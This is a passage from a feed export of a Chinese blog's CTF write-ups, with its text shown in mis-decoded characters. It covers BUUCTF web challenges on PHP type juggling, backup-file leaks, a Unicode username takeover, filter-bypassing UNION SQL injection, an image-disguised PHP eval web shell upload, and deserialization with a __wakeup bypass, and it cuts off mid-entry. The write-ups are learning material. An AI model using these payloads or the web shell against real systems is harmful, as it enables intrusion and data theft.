    <content type="html"><![CDATA[<h2 id="åå…­ã€"><a href="#åå…­ã€" class="headerlink" title="åå…­ã€"></a>åå…­ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/87d8cda4288f7a77.png">     </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>F12æºä»£ç æ³¨é‡Šä¸­æœ‰ä¸œè¥¿              </p><pre><code><pre><code class="hljs php">~~~post money <span class="hljs-keyword">and</span> password~~~<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;$password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-keyword">if</span> (is_numeric($password)) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;&#125;<span class="hljs-keyword">elseif</span> ($password == <span class="hljs-number">404</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;&#125;&#125;</code></pre></code></pre><p>ç„¶åhackbaræäº¤<code>password=404a&amp;&amp;money=100000000</code>æ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œçœ‹wpè¯´è¦æŠ“åŒ…<br><img src="https://ftp.bmp.ovh/imgs/2021/01/0c41b9b77eda1d97.png"><br>æŠŠ<code>user=0</code>æ”¹ä¸º<code>user=1</code>å…·ä½“ä»€ä¹ˆåŸå› ä¸æ¸…æ¥šï¼Œçœ‹åˆ«äººçš„wpï¼Œéƒ½è¯´<code>ctferçš„ç›´è§‰</code>???????<br><img src="https://ftp.bmp.ovh/imgs/2021/01/4d7c3957f073e099.png"><br>æç¤ºå¤ªé•¿ï¼Œå°†<code>1000000000</code>æ”¹ä¸ºç§‘å­¦è®¡æ•°æ³•<code>1e9</code>å¾—åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/9ef31f33edb1070a.png">    </p><hr><ul><li>å…¶ä»–è§£æ³•<br>strcmpæ¼æ´<br>phpç‰ˆæœ¬&lt;5.3<br>æ¯”è¾ƒå­—ç¬¦ä¸²<br><code>strcmp( string $str1, string $str2) : int</code><br>å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼›å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0<br>å½“è¿™ä¸ªå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œè¿™ä¸ªå‡½æ•°å°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯åœ¨5.3ä¹‹å‰çš„phpä¸­ï¼Œæ˜¾ç¤ºäº†æŠ¥é”™çš„è­¦å‘Šä¿¡æ¯åï¼Œå°†return 0 !!!! ä¹Ÿå°±æ˜¯è™½ç„¶æŠ¥äº†é”™ï¼Œä½†å´åˆ¤å®šå…¶ç›¸ç­‰äº†ã€‚<br>è¿™é“é¢˜moneyç”¨çš„strcmpå‡½æ•°æ˜¯çŒœçš„<br>ä¼ å…¥<code>money[]=1</code>å¾—åˆ°flag<img src="https://ftp.bmp.ovh/imgs/2021/01/a17a95096707fae9.png"><br>is_numericå‡½æ•°<br>åœ¨åé¢åŠ <code>%20</code>å¯ä»¥ç»•è¿‡<img src="https://ftp.bmp.ovh/imgs/2021/01/879552bbb54de0aa.png">           </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜015</title>
    <link href="/2021/01/29/BUU015/"/>
    <url>/2021/01/29/BUU015/</url>
    
    <content type="html"><![CDATA[<h2 id="åäº”ã€"><a href="#åäº”ã€" class="headerlink" title="åäº”ã€"></a>åäº”ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile<img src="https://ftp.bmp.ovh/imgs/2021/01/6fd96c03122d1956.png">       </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®æ˜¯backupfile<br><code>index.php.bak</code>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æ˜¯æºä»£ç <br><img src="https://ftp.bmp.ovh/imgs/2021/01/ceb9dba5b69a2030.png"><br>intvalå‡½æ•°â€“è·å–å˜é‡çš„æ•´æ•°å€¼         </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>payloadï¼š<code>?key=123</code>å¾—åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/fe55316b8cee6109.png">     </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li><code> backupfile-------index.php.bak</code>       </li><li>intvalå‡½æ•°<br><img src="https://ftp.bmp.ovh/imgs/2021/01/d9f32c85b2b7167d.png"><br>Note:<br>å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š<br>å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ<br>å¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ<br>å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚ </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜014</title>
    <link href="/2021/01/28/BUU014/"/>
    <url>/2021/01/28/BUU014/</url>
    
    <content type="html"><![CDATA[<h2 id="åå››ã€"><a href="#åå››ã€" class="headerlink" title="åå››ã€"></a>åå››ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[HCTF 2018]admin       </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>F12<br><img src="https://img-blog.csdnimg.cn/20200517202809438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RNXzEwMjQ=,size_16,color_FFFFFF,t_70"><br>æ‰€ä»¥åº”è¯¥ä»¥adminç™»å½•ï¼Œä½¿ç”¨burpçˆ†ç ´å¯†ç ï¼Œå‘ç°ä¸è¡Œ<br>ç½‘é¡µè¿˜æœ‰æ³¨å†ŒåŠŸèƒ½ï¼Œå°è¯•æ³¨å†Œadminï¼Œæœç„¶ï¼Œå·²æ³¨å†Œ<br>é‚£éšä¾¿æ³¨å†Œä¸€ä¸ªçœ‹çœ‹å§ï¼Œ<br>æ³¨å†Œåç½‘é¡µè¿˜æœ‰ä¿®æ”¹å¯†ç çš„åŠŸèƒ½ï¼Œæ‰“å¼€ï¼Œåœ¨F12ä¸­å‘ç°<img src="https://img-blog.csdnimg.cn/20200518084327983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RNXzEwMjQ=,size_16,color_FFFFFF,t_70"><br>æ‰“å¼€GitHubé¡µé¢ï¼Œåº”è¯¥æ˜¯ç½‘é¡µçš„æºç äº†<img src="https://ftp.bmp.ovh/imgs/2021/01/4bbc351205f263bf.png"><br><code>hctf_flask/app/routes.py</code>è¿™é‡Œæ‰¾åˆ°å„ä¸ªæ¨¡å—çš„æºç <br>python<br>flask<br>è¿™ä¸€å †ï¼Ÿï¼Ÿï¼ï¼è¿˜æ˜¯å»çœ‹wpå§          </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>æºç çš„ä¸»è¦å†…å®¹<br><strong>æ³¨å†Œæ¨¡å—ï¼š</strong>      </p><pre><code><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>():</span>    <span class="hljs-keyword">if</span> current_user.is_authenticated:        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))    form = RegisterForm()    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:        name = strlower(form.username.data)        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():            flash(<span class="hljs-string">&#x27;Wrong verify code.&#x27;</span>)            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form=form)        <span class="hljs-keyword">if</span> User.query.filter_by(username = name).first():            flash(<span class="hljs-string">&#x27;The username has been registered&#x27;</span>)            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;register&#x27;</span>))        user = User(username=name)        user.set_password(form.password.data)        db.session.add(user)        db.session.commit()        flash(<span class="hljs-string">&#x27;register successful&#x27;</span>)        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form = form)</code></pre></code></pre><p><strong>ç™»å½•æ¨¡å—ï¼š</strong>          </p><pre><code><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span>    <span class="hljs-keyword">if</span> current_user.is_authenticated:        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))    form = LoginForm()    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:        name = strlower(form.username.data)        session[<span class="hljs-string">&#x27;name&#x27;</span>] = name        user = User.query.filter_by(username=name).first()        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> user.check_password(form.password.data):            flash(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>)            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))        login_user(user, remember=form.remember_me.data)        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, title = <span class="hljs-string">&#x27;login&#x27;</span>, form = form)</code></pre></code></pre><p><strong>æ”¹å¯†ç æ¨¡å—ï¼š</strong>       </p><pre><code><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>():</span>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))    form = NewpasswordForm()    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:        name = strlower(session[<span class="hljs-string">&#x27;name&#x27;</span>])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(<span class="hljs-string">&#x27;change successful&#x27;</span>)        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change.html&#x27;</span>, title = <span class="hljs-string">&#x27;change&#x27;</span>, form = form)</code></pre></code></pre><p><strong>å®šä¹‰strlowerï¼š</strong>        </p><pre><code><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span>(<span class="hljs-params">username</span>):</span>    username = nodeprep.prepare(username)    <span class="hljs-keyword">return</span> username</code></pre></code></pre><p>ç™»å½•æœ‰session<br>æ”¹å¯†ç è¿˜éœ€è¦sessionéªŒè¯ç”¨æˆ·<br>æ³¨å†Œå’Œä¿®æ”¹å¯†ç éƒ½è¦ç»è¿‡ä¸€æ¬¡strlower<br>nodeprep.prepareå‡½æ•°ä¼šå°†unicodeå­—ç¬¦<code>á´¬</code>è½¬æ¢æˆ<code>A</code>ï¼Œè€Œ<code>A</code>åœ¨è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ä¼šæŠŠ<code>A</code>è½¬æ¢æˆ<code>a</code><br><a href="https://unicode-table.com/en/blocks/phonetic-extensions/">unicodeå­—ç¬¦</a><br><img src="https://ftp.bmp.ovh/imgs/2021/01/51a248229b93b61a.png">         </p><p>æ‰€ä»¥å¯ä»¥ç”¨Unicodeå­—ç¬¦<code>á´¬á´°á´¹á´µá´º</code>æ³¨å†Œï¼Œæ³¨å†Œå®Œæˆåä¼šå‘ç°æ˜¾ç¤ºçš„æ˜¯ADMIN,ç„¶åå†ä¿®æ”¹ä¸€æ¬¡å¯†ç ï¼Œè¿™æ ·å°±æŠŠadminçš„å¯†ç é‡ç½®äº†ï¼Œç„¶åç™»é™†å³å¯               </p><hr><p>è¿™é“é¢˜è¿˜æœ‰å…¶ä»–ä¸€äº›è§£æ³•ï¼Œä½†æˆ‘æœ‰ç‚¹ç†è§£ä¸äº†<br><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">MORE</a></p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li><p>Unicodeå­—ç¬¦         </p><blockquote><p>Unicode å­—ç¬¦å¯ä»¥é€‚ç”¨äºæ‰€æœ‰å·²çŸ¥çš„ç¼–ç ã€‚Unicode æ˜¯ç»§ ASCIIï¼ˆç¾å›½å›½å®¶äº¤äº’ä¿¡æ¯æ ‡å‡†ç¼–ç ï¼‰å­—ç¬¦ç åçš„ä¸€ç§æ–°å­—ç¬¦ç¼–ç ï¼Œå®ƒä¸ºæ¯ä¸€ä¸ªç¬¦å·å®šä¹‰ä¸€ä¸ªæ•°å­—å’Œåç§°ï¼Œå¹¶æŒ‡å®šå­—ç¬¦å’Œå®ƒçš„æ•°å€¼ï¼ˆç ä½ï¼‰ï¼Œä»¥åŠè¯¥å€¼çš„äºŒè¿›åˆ¶ä½è¡¨ç¤ºæ³•ï¼Œé€šè¿‡ä¸€ä¸ªåå…­è¿›åˆ¶æ•°å­—å’Œå‰ç¼€ï¼ˆUï¼‰å®šä¹‰ä¸€ä¸ª16ä½çš„æ•°å€¼ï¼Œå¦‚ï¼šU+0041 è¡¨ç¤º Aï¼Œå…¶å”¯ä¸€çš„åç§°æ˜¯ LATIN CAPITAL LETTER A.<a href="https://zhidao.baidu.com/question/6124060.html">MORE</a>          </p></blockquote></li><li><p>flask      </p><blockquote><p>Flaskæ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è½»é‡çº§ Web åº”ç”¨æ¡†æ¶ã€‚<br>flaskçš„sessionæ˜¯å­˜åœ¨å®¢æˆ·ç«¯çš„         </p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜013</title>
    <link href="/2021/01/27/BUU013/"/>
    <url>/2021/01/27/BUU013/</url>
    
    <content type="html"><![CDATA[<h2 id="åä¸‰ã€"><a href="#åä¸‰ã€" class="headerlink" title="åä¸‰ã€"></a>åä¸‰ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL<br><img src="https://ftp.bmp.ovh/imgs/2021/01/ba5c0550bde2d7d3.png">     </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>SQLæ³¨å…¥<br><code>username=1&#39;      password=1</code>æŠ¥é”™<br><code>username=1&#39;# password=1</code>æ²¡æœ‰æŠ¥é”™ï¼Œé‚£åº”è¯¥å°±æ˜¯å•å¼•å·å­—ç¬¦å‹äº†å§<br>ç„¶å<code>order by </code><img src="https://ftp.bmp.ovh/imgs/2021/01/2c23369b6aece50e.png"><br>åªå‰©äº†<code>der</code>è¯´æ˜<code>or</code>è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå› ä¸ºåªä¼šæ›¿æ¢ä¸€æ¬¡ï¼Œæ‰€ä»¥åŒå†™å³å¯ç»•è¿‡<code>oorrder by </code>ç„¶åå‘ç°<code>by</code>ä¹Ÿè¢«æ›¿æ¢äº†ï¼Œä½†è¿”å›æ˜¾ç¤ºçš„æ˜¯<code>1#</code>å‰é¢çš„orderä¸æ˜¯ç»•è¿‡äº†ä¹ˆï¼Œæ€ä¹ˆä¼šæ²¡æœ‰äº†ï¼Ÿï¼Ÿ<br><code>oorrder bbyy</code>å¾—åˆ°ä¸€å…±æœ‰ä¸‰åˆ—<br>è¿˜æœ‰<code>selectã€fromã€where</code>ä¹Ÿä¼šè¢«æ›¿æ¢        </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p><code>username=1&amp;password=1&#39; ununionion selselectect 1,2,(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>å¾—åˆ°æ‰€æœ‰åº“<img src="https://ftp.bmp.ovh/imgs/2021/01/6f07428aeecb4084.png"><br><code>username=1&amp;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=&#39;ctf&#39;),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>ctfä¸‹çš„è¡¨<img src="https://ftp.bmp.ovh/imgs/2021/01/faaaf5cf1ab77e21.png"><br><code>username=1&amp;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=&#39;Flag&#39;),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>Flagä¸‹çš„åˆ—<img src="https://ftp.bmp.ovh/imgs/2021/01/a316535fcd86d177.png"><br><code>username=1;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(flag) frfromom ctf.Flag),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>å¾—åˆ°flag<img src="https://ftp.bmp.ovh/imgs/2021/01/e332d6380e96f25e.png">    </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜012</title>
    <link href="/2021/01/26/BUU012/"/>
    <url>/2021/01/26/BUU012/</url>
    
    <content type="html"><![CDATA[<h2 id="åäºŒã€"><a href="#åäºŒã€" class="headerlink" title="åäºŒã€"></a>åäºŒã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload<br><img src="https://ftp.bmp.ovh/imgs/2021/01/6d2e2b3ae0376852.png">         </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆä¸Šä¸ª<code>.jpg</code><img src="https://ftp.bmp.ovh/imgs/2021/01/e24a1953387decc7.png"><br>???<br>åº”è¯¥æ˜¯<code>Content-Type</code>å§ï¼ŒæŠ“åŒ…æ˜¯è¿™æ ·<code>Content-Type: image/jpeg</code>æ”¹äº†åç¼€åè¿˜æ˜¯<code>not image</code>????<br>ä¼ ä¸ª<code>.php</code>é¡ºä¾¿æ”¹ä¸‹<code>Content-Type</code><img src="https://ftp.bmp.ovh/imgs/2021/01/f243cb9e7e51afb6.png"><br>çœ‹æ¥ä¼šæ£€æŸ¥åç¼€åï¼›å°†<code>.php</code>æ”¹ä¸º<code>.jpg</code><img src="https://ftp.bmp.ovh/imgs/2021/01/cebf65b0f76244c3.png"><br>è¯´æ˜ä¸èƒ½æœ‰<code>&lt;?</code><br>åç¼€æ”¹ä¸º<code>.phtml</code>ï¼Œå†…å®¹æ”¹ä¸º<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt; </code><img src="https://ftp.bmp.ovh/imgs/2021/01/989505f00c710eb4.png"><br>åŠ ä¸Š<code>GIF89a</code>æˆåŠŸä¸Šä¼ <br>èšå‰‘è¿æ¥          </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>è‡³äºè¿æ¥çš„è·¯å¾„ï¼Œçœ‹åˆ«äººçš„wpéƒ½è¯´çŒœçš„<code>/upload/æ–‡ä»¶å</code><br><code>..........................</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/5f8ff088e106744f.png"><br>åœ¨æ ¹ç›®å½•å‘ç°flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/85fc0fdb7ecda9f9.png">       </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><p><code>phtml</code>:åµŒå…¥PHPè„šæœ¬çš„htmlï¼Œä½¿ç”¨phtmlä½œä¸ºåç¼€å<br>å®Œå…¨æ˜¯PHPå†™çš„ï¼Œç”¨phpä½œä¸ºåç¼€å<br><code>GIF89a</code>:GIFå°±æ˜¯GIFæ–‡ä»¶çš„æ ‡è¯†ï¼›89aæ˜¯ç‰ˆæœ¬å·ï¼Œè¿˜æœ‰87a<br>å›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—      </p></blockquote><blockquote><p><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt; </code>     </p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜011</title>
    <link href="/2021/01/25/BUU011/"/>
    <url>/2021/01/25/BUU011/</url>
    
    <content type="html"><![CDATA[<h2 id="åä¸€ã€"><a href="#åä¸€ã€" class="headerlink" title="åä¸€ã€"></a>åä¸€ã€</h2><h3 id="é¢˜ç›®ï¼š-æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#é¢˜ç›®ï¼š-æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="é¢˜ç›®ï¼š[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>é¢˜ç›®ï¼š[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/01/c09882d30a32c90f.png">         </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç½‘é¡µæç¤ºè¯´å¤‡ä»½ç½‘ç«™ï¼Œç”¨å¾¡å‰‘æ‰«ï¼Œæ²¡æ‰«å‡ºæ¥<br>æ¢ä¸º<code>dirsearch</code>æ‰«å‡ºæ¥ä¸€ä¸ª<code>www.zip</code><img src="https://ftp.bmp.ovh/imgs/2021/01/96633462d343eda9.png"><br>åŠ åˆ°urlåé¢<code>http://63f0b170-4c01-4aa2-9608-5d33d689c712.node3.buuoj.cn/www.zip</code>å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå†…æœ‰äº”ä¸ªæ–‡ä»¶<br>ä¸»è¦å†…å®¹ï¼š<br><code>index.php</code> :    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>                 <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;              $select = $_GET[<span class="hljs-string">&#x27;select&#x27;</span>];              $res=unserialize(@$select);               <span class="hljs-meta">?&gt;</span>        ```      GET selectå‚æ•°ï¼Œååºåˆ—åŒ–          ``<span class="hljs-keyword">class</span>.php``:     ```php<span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&#x27;nonono&#x27;</span>;    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&#x27;yesyes&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = $username;        <span class="hljs-keyword">$this</span>-&gt;password = $password;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;            <span class="hljs-keyword">die</span>();        &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;            <span class="hljs-keyword">global</span> $flag;            <span class="hljs-keyword">echo</span> $flag;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;            <span class="hljs-keyword">die</span>();                    &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>usernameä¸ºadminï¼›passwordä¸º100æ—¶ï¼Œè¾“å‡ºflag<br>å› ä¸ºä¼ å…¥çš„selectä¼šç»è¿‡ååºåˆ—åŒ–ï¼Œæ‰€ä»¥æ„é€ çš„å‚æ•°åº”è¯¥ç»è¿‡åºåˆ—åŒ–<br>ä¸€ä½å¤§ä½¬çš„æºç ï¼š     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&quot;yesyesyes&quot;</span>;    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&quot;nonono&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username=$username;        <span class="hljs-keyword">$this</span>-&gt;password=$password;    &#125;&#125;$a = <span class="hljs-keyword">new</span> Name(@admin,<span class="hljs-number">100</span>);<span class="hljs-comment">//var_dump($a);</span><span class="hljs-comment">//echo &quot;&lt;br&gt;&quot;;</span>$b = serialize($a);<span class="hljs-keyword">echo</span> $b.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-comment">//è¾“å‡ºåºåˆ—åŒ–</span><span class="hljs-keyword">echo</span> urlencode($b);<span class="hljs-comment">//è¾“å‡ºurlç¼–ç åçš„åºåˆ—åŒ–</span><span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>è¿˜éœ€è¦ç»•è¿‡<code>_wakeup()</code>,å°†å±æ€§æ•°æ”¹ä¸º3æˆ–è€…å¤§äº3çš„æ•°å­—å³å¯         </p><h3 id="è§£"><a href="#è§£" class="headerlink" 